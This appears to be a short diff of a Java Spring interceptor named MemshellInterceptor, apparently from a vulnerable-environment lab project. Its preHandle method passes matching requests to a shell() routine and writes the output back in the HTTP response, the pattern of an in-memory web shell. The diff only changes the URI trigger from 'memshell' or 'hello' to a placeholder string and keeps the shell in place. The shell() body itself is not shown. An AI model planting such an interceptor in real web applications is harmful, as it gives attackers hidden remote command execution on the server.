@@ -23,7 +23,7 @@ public class MemshellInterceptor implements HandlerInterceptor {
     @Override
     public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
         String uri = request.getRequestURI();// /Spring_Vul_Env_war/hello
-        if (uri.contains("memshell") || uri.contains("hello")) {
+        if (uri.contains("xxxxx")) {
             String result = shell(request, response);
             PrintWriter writer =  response.getWriter();
             writer.write(result);
